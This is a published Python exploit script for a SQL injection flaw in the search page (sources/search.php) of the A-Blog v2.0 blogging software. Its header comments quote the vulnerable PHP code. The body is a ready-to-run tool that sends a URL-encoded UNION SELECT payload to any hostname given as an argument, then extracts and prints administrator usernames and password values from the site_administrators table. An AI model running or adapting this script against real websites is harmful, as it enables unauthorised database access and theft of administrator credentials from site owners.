A-Blog v2.0 (sources/search.php) SQL Injection Exploit
======================================================

#!/usr/bin/python
#
# Exploit Title:   A-Blog v2.0 (sources/search.php) SQL Injection Exploit
# Date         :   05 September 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/a-blog/
# Version      :   2.0
# Tested on    :   EasyPHP 5.3.1.0 for Windows with Python 3.1
#
#
# Description
# ===========
#
# + sources/search.php => This few lines of code strip whitespaces from the
#                         beginning and end of the &#039;words&#039; GET parameter. Then,
#                         all the whitespaces are replaced with %.
#
# 12: if ((array_key_exists(&#039;words&#039;, $_GET)) && ($_GET[&#039;words&#039;] == &#039;&#039;)) {
# 13: callback_js("page=results&words=$searchwords");
# 14: }
# 15:
# 16: else{
# 17: if ((array_key_exists(&#039;words&#039;, $_GET))) {
# 18: $words2 = trim($_GET[&#039;words&#039;]);
# 19: }
# 20: $search = str_replace(" ", "%", "$words2");
# 21: }
#
#
#                         the query below without being sanitized.
#
# 33: $sql = "SELECT * FROM site_news WHERE title LIKE &#039;%$search%&#039; OR home_text
#     LIKE &#039;%$search%&#039; OR extended_text LIKE &#039;%$search%&#039;";
# 34: $sql_result = mysql_query($sql,$connection) or die ("Couldnt execute query");
#
#
# + sources/search.php => Then, the results are echoed
#
# 39: while($row = mysql_fetch_array($sql_result)){
# 40:
# 41:   $id = $row[&#039;nid&#039;];
# 42:   $title = $row[&#039;title&#039;];
# 43:   $home = $row[&#039;home_text&#039;];
# 44:   $extended = $row[&#039;extended_text&#039;];
# 45:  
# 46:   echo "<li><a href=&#039;blog.php?view=news&id=$id&#039; title=&#039;Read $title&#039;>$title</a></li>";
# 47: }
#
 
import re
import sys
import textwrap
import http.client
 
 
def usage(program):
    print(&#039;Usage  : &#039; + program + &#039; <victim hostname> <path>\n&#039;)
    print(&#039;Example: &#039; + program + &#039; localhost /A-BlogV2/&#039;)
    print(&#039;         &#039; + program + &#039; www.victim.com /complete/path/&#039;)
    return
 
 
def removeDuplicates(mylist):
    d = {}
    for elem in mylist:
        d[elem] = 1
    return list(d.keys())
 
 
def exploit(target, path):
    payload  = &#039;search.php?words=%25%27/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/1%2C&#039;
    payload += &#039;CONCAT%28%27%3C1%3E%27%2Cname%2C%27%3A%27%2Cpassword%2C%27%3C2&#039;
    payload += &#039;%3E%27%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10/%2A%2A/FROM/%2A%2A/&#039;
    payload += &#039;site_administrators/%2A%2A/%23&#039;
 
    print(&#039;[+] Sending HTTP request\n&#039;)
    print(textwrap.fill(&#039;GET &#039; + path + payload) + &#039;\n&#039;)
    con = http.client.HTTPConnection(target)
    con.request(&#039;GET&#039;, path + payload)
    res = con.getresponse()
 
    if res.status != 200:
        print(&#039;[!] HTTP GET request failed&#039;)
        exit(1)
 
    print(&#039;[+] Parsing HTTP response&#039;)
    data = res.read().decode()
    pattern = re.compile(r"<1>([\w:]+?)<2>", re.M)
    credentials = removeDuplicates(pattern.findall(data))
 
    if len(credentials) > 0:
        print(&#039;[+] Credentials found\n&#039;)
        for element in credentials:
            print(element)
    else:
        print(&#039;[!] Credentials not found&#039;)
     
    return
 
 
 
print(&#039;\n+---------------------------------------------------------------------------+&#039;)
print(&#039;| A-Blog v2.0 (sources/search.php) SQL Injection Exploit by Ptrace Security |&#039;)
print(&#039;+---------------------------------------------------------------------------+\n&#039;)
 
if len(sys.argv) != 3:
    usage(sys.argv[0])
else:
    exploit(sys.argv[1], sys.argv[2])
 
exit(0)



